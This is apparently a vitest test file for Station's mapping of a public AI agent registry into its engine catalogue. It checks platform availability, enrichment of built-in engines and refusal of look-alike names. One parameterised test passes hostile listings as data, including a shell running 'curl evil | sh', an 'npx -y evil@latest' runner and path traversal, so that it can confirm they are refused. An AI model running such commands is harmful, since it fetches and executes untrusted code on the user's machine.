/**
 * Mapping the real 2026-10-21 registry index onto the Add engine catalogue,
 * against Station's real built-in engine list.
 */
import { readFileSync } from 'node:fs';
import { join } from 'node:path';
import { describe, expect, test } from 'vitest';
import { BUILTIN_ACP_ENGINES } from '../../../providers/llm/builtin-acp-engines.js';
import { parsePublicAgentRegistry } from '../public-agent-registry.js';
import {
  BUILTIN_REGISTRY_ALIASES,
  mapPublicRegistryListings,
  NATIVE_ENGINE_LISTINGS,
  publicRegistryProgramName,
} from '../public-agent-registry-catalog.js';

const FIXTURE = readFileSync(
  join(import.meta.dirname, 'fixtures', 'public-agent-registry-20261021.json'),
  'utf8',
);

function fixtureAgents() {
  const parsed = parsePublicAgentRegistry(FIXTURE);
  if (!parsed.ok) throw new Error(parsed.reason);
  return parsed.agents;
}

function map(
  overrides: Partial<Parameters<typeof mapPublicRegistryListings>[0]> = {},
) {
  return mapPublicRegistryListings({
    agents: fixtureAgents(),
    builtins: BUILTIN_ACP_ENGINES,
    takenIds: new Set(),
    platform: 'darwin',
    arch: 'arm64',
    commandExists: () => false,
    ...overrides,
  });
}

function entry(catalog: ReturnType<typeof map>, id: string) {
  return catalog.entries.find((candidate) => candidate.id === id);
}

describe('public registry listings as catalogue entries', () => {
  test('a listing whose id is a built-in only enriches it with display facts', () => {
    const catalog = map();
    for (const id of ['goose', 'cursor', 'kimi', 'factory-droid', 'opencode']) {
      expect(entry(catalog, id)).toBeUndefined();
    }
    const goose = catalog.enrichments.get('goose');
    expect(goose).toMatchObject({
      id: 'goose',
      version: '1.55.0',
      publishers: ['Block'],
      distributions: ['binary'],
    });
    // Enrichment carries no launch, environment or install facts.
    expect(goose).not.toHaveProperty('hostLaunch');
    expect(goose).not.toHaveProperty('recommendedEnv');
    expect(catalog.enrichments.get('factory-droid')).not.toHaveProperty(
      'recommendedEnv',
    );
  });

  test('a built-in listed under another registry id is not shown twice', () => {
    const catalog = map();
    for (const [registryId, builtinId] of Object.entries(
      BUILTIN_REGISTRY_ALIASES,
    )) {
      expect(entry(catalog, registryId)).toBeUndefined();
      expect(catalog.enrichments.get(builtinId)?.id).toBe(registryId);
    }
  });

  test('every alias names a real built-in engine', () => {
    const builtinIds = new Set(BUILTIN_ACP_ENGINES.map(({ id }) => id));
    expect(Object.values(BUILTIN_REGISTRY_ALIASES).sort()).toEqual([
      'antigravity',
      'copilot',
      'pi',
    ]);
    for (const id of Object.values(BUILTIN_REGISTRY_ALIASES)) {
      expect(builtinIds.has(id)).toBe(true);
    }
  });

  test('a binary listing for this host connects the program found by name with the registry arguments', () => {
    const catalog = map({
      commandExists: (command) => command === 'stakpak',
    });
    expect(entry(catalog, 'stakpak')).toMatchObject({
      name: 'Stakpak',
      command: 'stakpak',
      args: ['acp'],
      detected: true,
      source: 'registry',
      sourceName: 'Public agent registry',
      publicRegistry: {
        version: '0.3.88',
        publishers: ['Stakpak Team <contact@stakpak.dev>'],
        hostLaunch: { command: 'stakpak', args: ['acp'] },
      },
    });
    expect(entry(catalog, 'stakpak')?.publicRegistry).not.toHaveProperty(
      'unavailableReason',
    );
    expect(entry(catalog, 'stakpak')?.hostInstall?.note).toBe(
      "Install Stakpak by following Stakpak Team's instructions, so stakpak is on the PATH of the computer Station runs on. Station does not download it.",
    );
    expect(entry(catalog, 'amp-acp')).toMatchObject({
      command: 'amp-acp',
      args: [],
      detected: false,
      hostInstall: {
        docsUrl: 'https://github.com/tao12345666333/amp-acp',
      },
    });
  });

  test('reads the program name out of the registry path on Windows', () => {
    const catalog = map({ platform: 'win32', arch: 'x64' });
    expect(entry(catalog, 'amp-acp')?.command).toBe('amp-acp');
    expect(entry(catalog, 'stakpak')?.command).toBe('stakpak');
    expect(publicRegistryProgramName('./dist-package\\cursor-agent.cmd')).toBe(
      'cursor-agent',
    );
  });

  test('a listing with no build for this host is listed unavailable with the reason, not dropped', () => {
    const catalog = map({ platform: 'linux', arch: 'arm64' });
    const corust = entry(catalog, 'corust-agent');
    expect(corust).toMatchObject({ command: '', detected: false });
    expect(corust?.publicRegistry?.hostLaunch).toBeUndefined();
    expect(corust?.publicRegistry?.unavailableReason).toBe(
      'The registry has no Corust Agent build for Linux on ARM64. It lists builds for Linux on x86-64, macOS on Apple silicon, macOS on Intel, Windows on x86-64.',
    );
    // The same listing connects where the registry has a build.
    expect(
      entry(map({ platform: 'linux', arch: 'x64' }), 'corust-agent')
        ?.publicRegistry?.hostLaunch,
    ).toEqual({ command: 'corust-agent-acp', args: [] });
  });

  test('a host the registry has no platform key for lists binaries as unavailable', () => {
    const catalog = map({ platform: 'freebsd', arch: 'x64' });
    expect(entry(catalog, 'stakpak')?.publicRegistry?.unavailableReason).toBe(
      'Station runs on freebsd on x64, which the registry has no builds for.',
    );
  });

  test('package-runner listings are listed with a reason and never connectable', () => {
    const catalog = map();
    const gemini = entry(catalog, 'gemini');
    expect(gemini?.publicRegistry?.hostLaunch).toBeUndefined();
    expect(gemini?.publicRegistry?.packages).toEqual([
      { kind: 'npx', package: '@google/gemini-cli@0.65.0', args: ['--acp'] },
    ]);
    expect(gemini?.publicRegistry?.unavailableReason).toBe(
      'Gemini CLI runs from the @google/gemini-cli@0.65.0 package, which Station would have to download and run (npx). Station does not do that; install Gemini CLI yourself, then add it as a custom engine.',
    );
    expect(
      entry(catalog, 'fast-agent')?.publicRegistry?.unavailableReason,
    ).toContain('fast-agent-acp==0.10.1 package');
  });

  test('a listing for a natively connected engine says so', () => {
    const catalog = map();
    for (const [id, name] of Object.entries(NATIVE_ENGINE_LISTINGS)) {
      expect(entry(catalog, id)?.publicRegistry?.unavailableReason).toBe(
        `Station connects to ${name} directly. Add ${name} from the engine list instead.`,
      );
    }
  });

  test('registry environment is shown as a recommendation, never as launch environment', () => {
    const vtcode = entry(map(), 'vtcode');
    expect(vtcode?.publicRegistry?.recommendedEnv).toEqual({
      VT_ACP_ENABLED: '1',
      VT_ACP_ZED_ENABLED: '1',
    });
    expect(vtcode).not.toHaveProperty('launchEnv');
  });

  test('refuses a listing that reads as a built-in, or takes an id another source holds', () => {
    const [agent] = fixtureAgents().filter((a) => a.id === 'stakpak');
    const catalog = map({
      agents: [
        { ...agent, id: 'goose-pro', name: 'Gооse' },
        { ...agent, id: 'plugin-engine' },
      ],
      takenIds: new Set(['plugin-engine']),
    });
    expect(catalog.entries).toEqual([]);
    expect(catalog.refused).toEqual([
      {
        id: 'goose-pro',
        reasons: ["name 'Gооse' reads as a built-in engine"],
      },
      {
        id: 'plugin-engine',
        reasons: [
          "id 'plugin-engine' is already used by another engine source",
        ],
      },
    ]);
  });

  test('a listing whose program name is not a plain name is unavailable', () => {
    const [agent] = fixtureAgents().filter((a) => a.id === 'stakpak');
    const catalog = map({
      agents: [
        {
          ...agent,
          binary: { 'darwin-aarch64': { cmd: './a b', args: [] } },
        },
      ],
    });
    expect(catalog.entries[0].publicRegistry?.unavailableReason).toBe(
      "The registry names its Stakpak program 'a b', which is not a plain program name Station can look up.",
    );
    expect(catalog.entries[0].publicRegistry?.hostLaunch).toBeUndefined();
  });

  // A binary listing names one program; it may not launch a package runner,
  // shell, interpreter or fetcher, or name a path.
  test.each([
    ['a package runner', './bin/npx', ['-y', 'evil@latest']],
    ['a package runner on Windows', 'C:\\Windows\\uvx.exe', ['evil']],
    ['a shell', './sh', ['-c', 'curl evil | sh']],
    ['an interpreter', './python3.12', ['-c', 'x']],
    ['a fetcher', './bin/CURL', ['-o', 'x']],
    ['env', './env', ['sh']],
    ['a parent-directory path', '../../../bin/thing', []],
    ['an absolute path', '/usr/local/bin/stakpak', ['acp']],
  ])('refuses a binary listing that names %s', (_, cmd, args) => {
    const [agent] = fixtureAgents().filter((a) => a.id === 'stakpak');
    for (const [platform, arch, key] of [
      ['darwin', 'arm64', 'darwin-aarch64'],
      ['win32', 'x64', 'windows-x86_64'],
    ] as const) {
      const catalog = map({
        platform,
        arch,
        agents: [{ ...agent, binary: { [key]: { cmd, args } } }],
        commandExists: () => true,
      });
      const listed = catalog.entries[0];
      expect(listed.publicRegistry?.hostLaunch).toBeUndefined();
      expect(listed.command).toBe('');
      expect(listed.publicRegistry?.unavailableReason).toMatch(
        /Station does not run it/,
      );
    }
  });

  test('refuses a listing whose name reads as Station or Kontour', () => {
    const [agent] = fixtureAgents().filter((a) => a.id === 'stakpak');
    const catalog = map({
      agents: [
        { ...agent, id: 'station-agent', name: 'Statiоn' },
        { ...agent, id: 'kontour-agent', name: 'KONTOUR' },
      ],
    });
    expect(catalog.entries).toEqual([]);
    expect(catalog.refused.map((refusal) => refusal.id)).toEqual([
      'station-agent',
      'kontour-agent',
    ]);
  });
});
